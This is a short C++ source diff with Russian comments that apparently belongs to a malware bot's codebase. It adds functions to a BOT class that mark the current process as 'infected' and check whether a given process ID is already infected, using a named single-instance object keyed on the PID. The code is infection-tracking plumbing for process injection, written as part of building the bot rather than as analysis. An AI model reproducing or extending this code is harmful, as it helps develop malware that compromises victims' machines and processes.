@@ -373,3 +373,45 @@ PCHAR BOT::MakeWorkFolder()
 
 	return BOT_WORK_FOLDER_NAME;
 }
+
+
+
+//----------------------------------------------
+//  CreateInfectedProcessHandle
+//  Функция создаёт объяект информирования
+//  об инфицировании процесса
+//----------------------------------------------
+HANDLE CreateInfectedProcessHandle(DWORD PID)
+{
+	if (!PID) PID = Bot->PID();
+	string Prefix;
+	Prefix.LongToStr(PID);
+	Prefix += "PI";
+	return TryCreateSingleInstance(Prefix.t_str());
+}
+
+//----------------------------------------------
+// MarkAsInfcted
+// Функция омечает текущий поцесс как
+// инфицированный
+//----------------------------------------------
+void BOT::MarkAsInfcted()
+{
+	CreateInfectedProcessHandle(0);
+}
+
+//----------------------------------------------
+//  ProcessInfected
+//
+//  Функция возвращает истину если процесс с
+//  указанными пидом инфицирован
+//----------------------------------------------
+bool BOT::ProcessInfected(DWORD PID)
+{
+	// Не уевой объект будет означать, что был создан
+    // первый экземпляр
+	HANDLE Handle = CreateInfectedProcessHandle(PID);
+	bool Result = Handle == NULL;
+	pCloseHandle(Handle);
+	return Result;
+}
